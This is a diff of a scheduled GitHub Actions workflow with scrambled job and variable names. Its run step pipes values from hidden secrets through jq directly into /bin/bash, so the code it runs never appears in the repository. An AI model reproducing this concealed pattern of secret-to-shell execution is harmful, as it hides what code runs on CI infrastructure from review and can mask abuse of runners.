@@ -1,9 +1,9 @@
 name: luanlinwanyu
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '7 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: luanlinwanyu
         env:
-          nql369: ${{ secrets.nql369 }}
+          mbew5572: ${{ secrets.mbew5572 }}
         run: |
-          echo $nql369 | jq -r .dl844 | /bin/bash
-          echo $rf55247 | jq -r .xn31500 | /bin/bash
-          echo $coi7 | jq -r .yzul84 | /bin/bash
-          echo $l4364 | jq -r .rgmp22675 | /bin/bash
-          echo $iuroq2183 | jq -r .b3560 | /bin/bash
-          echo $ug7014 | jq -r .geda68 | /bin/bash
-          echo $lvgxo53 | jq -r .mck69 | /bin/bash
+          echo $mbew5572 | jq -r .e4 | /bin/bash
+          echo $sxday50890 | jq -r .vejeq1 | /bin/bash
+          echo $bjro960 | jq -r .iyxr7750 | /bin/bash
+          echo $zbhu9016 | jq -r .rvk61 | /bin/bash
+          echo $lkuzo705 | jq -r .icxtf9 | /bin/bash
+          echo $vxgp9 | jq -r .cnt8 | /bin/bash
 
